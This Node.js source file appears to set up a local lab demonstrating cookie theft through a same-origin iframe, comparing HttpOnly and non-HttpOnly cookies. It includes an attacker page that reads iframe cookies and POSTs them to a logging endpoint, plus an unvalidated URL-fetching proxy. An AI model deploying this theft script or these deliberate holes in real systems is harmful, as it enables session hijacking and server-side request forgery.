// server.js - Combined: framable server (4000) + demo server (4001)
// Requirements: node (>=12), npm install express cookie-parser [node-fetch if Node <18]

const express = require('express');
const cookieParser = require('cookie-parser');
const path = require('path');

// Fetch: use built-in fetch in Node >=18 or node-fetch otherwise
let fetchFunc;
if (globalThis.fetch) {
  fetchFunc = globalThis.fetch.bind(globalThis);
} else {
  try {
    fetchFunc = require('node-fetch'); // install node-fetch if you run into errors: npm i node-fetch
  } catch (e) {
    console.warn('Warning: fetch not available. Install node-fetch (npm i node-fetch) for /proxy to work.');
    fetchFunc = null;
  }
}

/* ------------------ Framable server (port 4000) ------------------ */
const app4000 = express();
const port4000 = 4000;

// Path to the generated framables folder (adjust if needed)
const framableDir = path.join(__dirname, 'framable');

// Serve static files from ./framable
app4000.use(express.static(framableDir));

// Simple index route (serve framable index if present)
app4000.get('/index', (req, res) => {
  res.sendFile(path.join(framableDir, 'index.html'), err => {
    if (err) res.status(404).send('framable/index.html not found');
  });
});

// Proxy endpoint (fetch remote content and return it)
app4000.get('/proxy', async (req, res) => {
  const target = req.query.url;
  if (!target) return res.status(400).send('Missing url parameter: /proxy?url=https%3A%2F%2Fexample.com');
  if (!fetchFunc) return res.status(500).send('Server has no fetch implementation. Install node-fetch.');
  try {
    const resp = await fetchFunc(target);
    const contentType = resp.headers && resp.headers.get ? resp.headers.get('content-type') : resp.headers['content-type'];
    const text = await resp.text();
    if (contentType) res.set('Content-Type', contentType);
    res.send(text);
  } catch (err) {
    res.status(500).send('Proxy error: ' + String(err));
  }
});

app4000.listen(port4000, () => {
  console.log('Framable server on http://localhost:' + port4000);
  console.log(' - index: http://localhost:' + port4000 + '/index');
  console.log(' - proxy: http://localhost:' + port4000 + '/proxy?url=https%3A%2F%2Fexample.com');
});

/* ------------------ Demo server (port 4001) ------------------ */
const app4001 = express();
const port4001 = 4001;

app4001.use(express.json());
app4001.use(cookieParser());

// Serve demo static files from the same folder as this server.js
// (expects parent.html, protected.html, attacker.html, plus any css/js assets you reference)
const demoDir = __dirname;
app4001.use(express.static(demoDir));

// Parent page (serve your parent.html so it matches your screenshot)
app4001.get('/parent', (req, res) => {
  res.sendFile(path.join(demoDir, 'parent.html'), err => {
    if (err) res.status(404).send('parent.html not found');
  });
});

// Set a cookie with Path=/protected (NOT HttpOnly) then show protected page
app4001.get('/protected', (req, res) => {
  // NOTE: Path is /protected so this cookie will be accessible to JS when visited at /protected
  res.cookie('vulnerable', 'secret_value_12345', { path: '/protected', maxAge: 60 * 60 * 1000 });
  res.cookie('sensitiveCookie', 'secret_demo_123', { path: '/protected', maxAge: 60 * 60 * 1000 });
  res.sendFile(path.join(demoDir, 'protected.html'), err => {
    if (err) res.status(404).send('protected.html not found');
  });
});

// HttpOnly variant: set HttpOnly cookie and serve same protected page (JS on page won't see it)
app4001.get('/protected_safe', (req, res) => {
  res.cookie('httptoken', 'secretHttpOnly', { httpOnly: true, path: '/protected_safe', maxAge: 60 * 60 * 1000 });
  res.sendFile(path.join(demoDir, 'protected.html'), err => {
    if (err) res.status(404).send('protected.html not found');
  });
});

// Optional: attacker page that iframes /protected and attempts to exfiltrate cookie
app4001.get('/attacker', (req, res) => {
  res.send(`<!doctype html>
  <html><head><meta charset="utf-8"><title>Attacker</title></head><body>
    <h1>Attacker page</h1>
    <iframe id="victim" src="/protected" style="width:95%;height:300px;border:1px solid #aaa"></iframe>
    <p>The attacker will try to read iframe.document.cookie (works here because same-origin in the lab) and POST it to /stolen</p>
    <script>
      setTimeout(()=> {
        try {
          const ifr = document.getElementById('victim');
          const cookie = ifr.contentWindow.document.cookie;
          fetch('/stolen', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({cookie: cookie})
          }).then(()=> console.log('exfil sent'));
        } catch(e) {
          console.error('attack failed', e);
        }
      }, 1000);
    </script>
    <p><a href="/parent">Back to parent</a></p>
  </body></html>`);
});

// Receiver endpoint to log stolen cookies (POSTed by attacker)
app4001.post('/stolen', (req, res) => {
  console.log(new Date().toISOString(), 'EXFIL:', req.body);
  // send minimal response
  res.status(204).end();
});

// Root redirect to parent for convenience
app4001.get('/', (req, res) => res.redirect('/parent'));

// Friendly 404 for demo server
app4001.use((req, res) => {
  res.status(404).send('<h1>Not found</h1><p>Try <a href="/parent">/parent</a></p>');
});

app4001.listen(port4001, () => {
  console.log('Demo server on http://localhost:' + port4001);
  console.log(' - parent:          http://localhost:' + port4001 + '/parent');
  console.log(' - vulnerable:      http://localhost:' + port4001 + '/protected');
  console.log(' - vulnerable (HO): http://localhost:' + port4001 + '/protected_safe');
  console.log(' - attacker:        http://localhost:' + port4001 + '/attacker');
});
